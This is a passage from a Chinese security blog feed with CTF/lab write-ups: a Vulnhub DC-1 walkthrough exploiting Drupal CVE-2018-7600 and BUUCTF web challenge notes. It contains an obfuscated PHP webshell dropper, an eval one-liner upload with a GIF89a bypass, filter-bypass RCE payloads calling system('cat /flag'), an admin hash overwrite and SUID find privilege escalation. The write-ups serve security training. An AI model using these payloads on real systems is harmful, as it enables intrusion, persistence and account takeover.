Support/typora-user-images/image-20200218152359315.png)</p><p>然后把我的<code>IP</code>给<code>ban</code>了，这个账号也被暂时冻结，IP被冻结可以通过IP池来爆破，但账号被冻结一般莫得办法</p><p>这时候进不去的话，看看Web服务有没有什么问题</p><p>搜了一下，发现存在<code>CVE-2018-7600（远程代码执行漏洞）</code></p><p>具体原理分析<a href="https://www.cnblogs.com/safoie/p/10601715.html" target="_blank" rel="noopener">https://www.cnblogs.com/safoie/p/10601715.html</a></p><p>在<code>Github</code>找到一个可用的<code>POC</code></p><p><a href="https://github.com/FireFart/CVE-2018-7600" target="_blank" rel="noopener">https://github.com/FireFart/CVE-2018-7600</a></p><p>稍微修改了一下一下来执行任意命令</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218154749.png" alt=""></p><p>这里直接写个<code>shell</code>进去</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo "&lt;?php file_put_contents(__FILE__,base64_decode(chr(80).chr(68).chr(57).chr(119).chr(97).chr(72).chr(65).chr(103).chr(90).chr(88).chr(90).chr(104).chr(98).chr(67).chr(103).chr(107).chr(88).chr(49).chr(66).chr(80).chr(85).chr(49).chr(82).chr(98).chr(89).chr(86).chr(48).chr(112).chr(79).chr(122).chr(56).chr(43)));?&gt;" &gt; a2u13.php;</span><br></pre></td></tr></table></figure><p>执行之后访问一下即可生成一个密码为<code>a</code>的<code>shell</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218162201.png" alt=""></p><p>然后直接蚁剑连上即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218162237.png" alt=""></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>这是得到的第一个<code>flag</code>,就在网站目录下面</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218162422.png" alt=""></p><p>得到提示要看配置文件</p><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>查了一下得知<code>Drupal</code>的配置文件在<code>/sites/default/settings.php</code>当中</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218170653.png" alt=""></p><p>得到了第二个<code>flag</code></p><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p><code>flag2</code>的提示是不要瞎乱爆破，刚才被冻结账号和IP地址就是教训</p><p>所以我猜这里应该要连接数据库之类的操作</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218170940.png" alt=""></p><p>这里给了数据库账号和密码，直接用蚁剑自带的数据库连接工具连接即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218171941.png" alt=""></p><p>这里得到了管理员的密码，虽然被加密了，但由于可以操控数据库，所以可以重置掉</p><p><a href="https://www.iteye.com/blog/xieyanxy9-1320266" target="_blank" rel="noopener">如何重置Drupal 7的用户密码</a></p><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh a2u13 &gt; <span class="keyword">new</span><span class="type">_pwd</span>.txt</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218174711.png" alt=""></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> <span class="string">`users`</span> <span class="keyword">SET</span> pass=<span class="string">'$S$D9djYRHyJ3WrcifUO96JigLC8Dr6qPCnHWZp6lbTUWpUC0sehbn5'</span> <span class="keyword">WHERE</span> <span class="keyword">name</span>=<span class="string">'admin'</span>;</span><br></pre></td></tr></table></figure><p>在数据库里把<code>admin</code>密码的哈希给改了</p><p>但我们这里<code>admin</code>账号被5次登陆失败限制了，这时候得解除限制</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218173530.png" alt=""></p><p>然后直接<code>username:admin password:a2u13</code>进去了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218174825.png" alt=""></p><p>在<code>Contnet</code>界面中得到<code>flag3</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218174956.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218175026.png" alt=""></p><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>这里得提到<code>SUID提权</code></p><p><a href="https://www.cnblogs.com/BOHB-yunying/articles/11517748.html" target="_blank" rel="noopener">Linux常见提权</a></p><p><a href="https://www.dazhuanlan.com/2019/09/27/5d8d2821c2fe4/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/27/5d8d2821c2fe4/</a></p><p><a href="https://blog.51cto.com/10794428/1851382" target="_blank" rel="noopener">SUID</a></p><p><strong>已知的可用来提权的linux可行性的文件列表如下：</strong></p><ul><li>nmap</li><li>vim</li><li>find</li><li>bash</li><li>more</li><li>less</li><li>nano</li><li>cp</li></ul><blockquote><p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。</p></blockquote><blockquote><p>但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p></blockquote><blockquote><p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p></blockquote><ol><li><p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p></li><li><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p></li><li><p><code>find / -user root -perm -4000 -exec ls -ldb {} ;</code></p></li></ol><hr><ul><li><code>-perm</code> 使用文件权限模式查找</li><li><code>-user</code> 按照属主查找</li><li><code>-type</code> 文件类型</li><li><code>-d</code> 仅显示目录名，而不显示目录下的内容列表。显示符号链接文件本身，而不显示其所指向的目录列表</li><li><code>-b</code> 将文件中的不可输出的字符以反斜线“”加字符编码的方式输出</li><li><code>-exec</code> 后面跟的是<code>command</code>命令，它的终止是以<code>;</code>为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。{}花括号代表前面find查找出来的文件名。</li></ul><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218184909.png" alt=""></p><p>这里看到<code>find</code>命令存在<code>SUID</code>，那么就可以依靠<code>find</code>命令的<code>-exec</code>参数就可以以<code>root</code>的身份执行命令了</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218185250.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218190018.png" alt=""></p><p>从而提权到<code>root</code>权限</p><p><a href="https://github.com/NullArray/RootHelper" target="_blank" rel="noopener">https://github.com/NullArray/RootHelper</a></p><p>这个是脚本下载器，可以下载和提权有关的脚本</p><p>这里附上一个巨好用的环境探测脚本，放到服务器上然后给权限运行即可</p><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></p><p>这是用这个脚本探测到的用户组，其中包含<code>flag4</code>的用户</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218201513.png" alt=""></p><p>进去读到了<code>flag</code>文件</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218202027.png" alt=""></p><h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>这里提示要以<code>root</code>权限读取第五个<code>flag</code></p><p>那么就用刚才的<code>find -exec</code>以<code>root</code>方式来执行命令即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218202716.png" alt=""></p><p>得到<code>flag</code>文件的名字</p><p>然后读取即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218202905.png" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul><li>对于一个渗透测试目标，首先最重要的就是信息搜集，比如端口开放情况，敏感目录等等</li><li>对于常见的端口的服务得额外注意，比如<code>Redis</code>未授权访问等</li><li>对于存在的<code>Web服务</code>，要探测他的后台程序是否存在<code>CVE</code>漏洞等等，能找到的可以直接一键打</li><li>对于一个CMS，要找到他的配置文件等等，或许可能泄露他的数据库连接信息等等</li><li>如果得到了数据库权限，而且得到了管理员密码加密方式等等，可以直接自己生成一个哈希给覆盖掉，而不必考虑破解</li><li>对于常见的提权方法要知道，比如内核提权，SUID提权，计划任务等等</li><li>总而言之最重要的就是要细心，不能放过任何细节</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;DC-1考点&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Drupal 7任意命令执行漏洞（CVE-2018-7600）&lt;/li&gt;
&lt;li&gt;管理员密码哈希覆盖&lt;/li&gt;
&lt;li&gt;SUID提权&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://a2u13.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Vulnhub" scheme="https://a2u13.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF刷题笔记（五）</title>
    <link href="https://a2u13.com/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <id>https://a2u13.com/2020/02/17/BUUCTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/</id>
    <published>2020-02-17T13:16:30.000Z</published>
    <updated>2020-06-07T06:28:28.943Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200212161847.png" alt=""></p><p><strong>题目列表：</strong></p><ul><li>[极客大挑战 2019]Upload</li><li>[CISCN 2019 初赛]Love Math</li><li>[GXYCTF2019]禁止套娃</li><li>[极客大挑战 2019]HardSQL</li><li>[GXYCTF2019]BabySQli</li><li>[安洵杯 2019]easy_serialize_php</li><li>[ACTF2020 新生赛]Include</li><li>[SUCTF 2019]EasyWeb</li></ul><a id="more"></a><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>这道题之前成信工新生赛的时候做过，测出来得上传<code>phtml</code>文件上传</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000338.png" alt=""></p><p>这个可以通过</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"php"</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_GET[<span class="string">'a'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>来绕过</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000447.png" alt=""></p><p>这个可以通过增加<code>GIF89a</code>头部幻数来绕过</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000530.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200218000652.png" alt=""></p><p>最后访问连接一句话得到<code>flag</code></p><h1 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里给了源码</p><p>这道题给了许多数学函数，但没有给<code>hex2bin</code>，这里我们得构造出<code>hex2bin</code>这个函数</p><p>通过使用<code>base_convert</code>函数，可以实现任意进制之间互相转化</p><p>由于这里只容许输入数字和那几个数学函数，那么可以考虑从十进制往高进制进行转换，就可以组合成我们需要的字符串，比如：</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225012300.png" alt=""></p><p>这里限定了长度为最多80位，那么得尽量缩短<code>payload</code>长度</p><p>这里写了个脚本来找一下从十进制转换到能生成<code>hex2bin</code>字符串最少位数的高位进制</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$strr = <span class="string">"hex2bin"</span>;</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">36</span>;$k&gt;=<span class="number">1</span>;$k--)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $k.<span class="string">"=&gt;"</span>.<span class="string">"10"</span>.<span class="string">":"</span>.strlen(base_convert($strr, $k, <span class="number">10</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225012528.png" alt=""></p><p>由于字母<code>x</code>需要最小进制为34进制，而34进制以上的进制位数都一致，那么这里选择34进制来构造<code>hex2bin</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225012705.png" alt=""></p><p>那么可以通过<code>base_convert(26941962055,10,34)</code>来构造出<code>hex2bin</code></p><h2 id="GET传入参数"><a href="#GET传入参数" class="headerlink" title="$_GET传入参数"></a>$_GET传入参数</h2><p>有了<code>hex2bin</code>，那么来构造<code>_GET</code></p><blockquote><p><code>_GET</code>的十六进制为<code>5f474554</code></p><p>通过<code>hexdec</code>函数得到<code>_GET</code>的十进制为<code>1598506324</code></p></blockquote><p>则可以通过<code>base_convert(26941962055,10,34)(dechex(1598506324))</code>来过的<code>_GET</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200225013340.png" alt=""></p><p>由于<code>pi</code>输入数学函数没有被过滤，则可以通过</p><p><code>$pi=base_convert(26941962055,10,34)(dechex(1598506324))</code>来把<code>_GET</code>赋给<code>pi</code></p><p>由于<code>PHP</code>的动态变量，可以通过<code>$$pi</code>来实现<code>$_GET</code></p><p>有了<code>$_GET</code>就可以传入数据了，<code>$_GET[xxxx]</code>其中<code>[]</code>可以<code>{}</code>来替代</p><p>此时传入变量即可</p><blockquote><p><code>($$pi){1} =&gt; $_GET[1]</code></p><p><code>($$PI){1}(($$pi){2}) =&gt; $_GET[1]($_GET[2])</code></p></blockquote><p>传入<code>GET</code>参数</p><p><code>1=system&amp;2=cmd</code>即可</p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/?c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert(<span class="number">26941962055</span>,<span class="number">10</span>,<span class="number">34</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">1</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">2</span>&#125;)&amp;<span class="number">1</span>=<span class="keyword">system</span>&amp;<span class="number">2</span>=ls /</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226140643.png" alt=""></p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/?c=<span class="symbol">$</span><span class="built-in">pi</span>=base_convert(<span class="number">26941962055</span>,<span class="number">10</span>,<span class="number">34</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">1</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>)&#123;<span class="number">2</span>&#125;)&amp;<span class="number">1</span>=<span class="keyword">system</span>&amp;<span class="number">2</span>=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226140726.png" alt=""></p><h2 id="getallheaders-函数"><a href="#getallheaders-函数" class="headerlink" title="getallheaders()函数"></a>getallheaders()函数</h2><p><a href="https://www.php.net/manual/zh/function.getallheaders.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.getallheaders.php</a></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226141248.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226145249.png" alt=""></p><p>这里同样构造</p><blockquote><p><code>$pi=base_convert</code><br>​<code>$pi(8768397090111664438,10,30) =&gt; getallheaders</code><br><code>$pi(1522870287,10,35) =&gt; system</code></p></blockquote><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">/?c=$pi=base_convert,$pi(<span class="number">1522870287</span>,<span class="number">10</span>,<span class="number">35</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226145341.png" alt=""></p><h2 id="数学函数异或"><a href="#数学函数异或" class="headerlink" title="数学函数异或"></a>数学函数异或</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>($k=<span class="number">0</span>;$k&lt;sizeof($whitelist);$k++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">9</span>;$i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>;$j&lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">            $payload = $whitelist[$k] ^ $i.$j;</span><br><span class="line">            <span class="keyword">if</span>(strcmp($payload, <span class="string">"_G"</span>)==<span class="number">0</span> || strcmp($payload, <span class="string">"ET"</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> $whitelist[$k] . <span class="string">"^"</span> . $i.$j.$z.$x.$y . <span class="string">"=&gt;"</span> . $payload;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226153558.png" alt=""></p><blockquote><p><code>is_nan^(6).(4) =&gt; _G</code></p><p><code>tan^(1).(5) =&gt; ET</code></p><p><code>(is_nan^(6).(4)).(tan^(1).(5)) =&gt; _GET</code></p></blockquote><p>同理构造即可读到<code>flag</code></p><figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/?c=<span class="symbol">$</span><span class="built-in">pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(<span class="built-in">tan</span>^(<span class="number">1</span>).(<span class="number">5</span>));<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>&#123;<span class="built-in">abs</span>&#125;(<span class="symbol">$</span><span class="symbol">$</span><span class="built-in">pi</span>&#123;<span class="built-in">pi</span>&#125;)&amp;<span class="built-in">abs</span>=<span class="keyword">system</span>&amp;<span class="built-in">pi</span>=cat /flag</span><br></pre></td></tr></table></figure><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226154022.png" alt=""></p><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>扫一下目录</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226155247.png" alt=""></p><p>有<code>Git</code>泄露，恢复一下</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226155313.png" alt=""></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;</code></p></blockquote><p>这个正则当中，<code>(?R)</code>是引用当前表达式的意思，即可以用<code>[a-z,_]+((?R)?)</code>替换<code>1(?R)</code>的位置</p><p><code>(?R)?</code>这里多一个<code>?</code>表示可以有引用，也可以没有。</p><p>理论写再多也没例子直观，这里举个例子：</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">abc()</span><br><span class="line">abc(<span class="name">abc</span>())</span><br><span class="line">abc(<span class="name">abc</span>(<span class="name">abc</span>))</span><br><span class="line">abc(<span class="name">abc</span>(<span class="name">abc</span>(<span class="name">abc</span>())))</span><br></pre></td></tr></table></figure><p>就这么个意思</p><p>这里第一层过滤不能用协议读</p><p>那么只能依靠 PHP内置的函数来一层一层读了</p><h2 id="session-id-session-start"><a href="#session-id-session-start" class="headerlink" title="session_id(session_start())"></a>session_id(session_start())</h2><p>这里没有过滤<code>readfile()或者highlight_file()</code>函数，可以通过这个函数来读取文件内容</p><p>通过<code>session_id(session_start())</code>来读取<code>SESSION</code></p><p>然后设置<code>PHPSESSID</code>为<code>flag.php</code>即可</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226162711.png" alt=""></p><h2 id="array-rand"><a href="#array-rand" class="headerlink" title="array_rand()"></a>array_rand()</h2><p>首先通过<code>localeconv()</code>函数得到<code>.</code>用来指向当前路径</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226163356.png" alt=""></p><p>然后得得到第一个元素，这里方法很多</p><ul><li>array_shift($array) //第一个元素</li><li>array_pop($array) //最后一个元素</li><li>current($array) //第一个元素</li><li>end($array) //最后一个元素</li></ul><p>这样就通过<code>scandir(array_shift(localeconv))</code>获取到了当前目录</p><p>然后就可以读文件了</p><p>但这里<code>flag.php</code>不是第一个或者最后一个文件</p><p>不能直接<code>readfile</code>，读取到，得一个一个随机函数来随机读取到<code>flag.php</code></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165425.png" alt=""></p><p>然后通过<code>array_flip()</code>函数来交换键值对</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226164544.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165348.png" alt=""></p><p>最后通过<code>array_rand</code>来获取随机的键名</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165904.png" alt=""></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/20200226165915.png" alt=""></p><figure 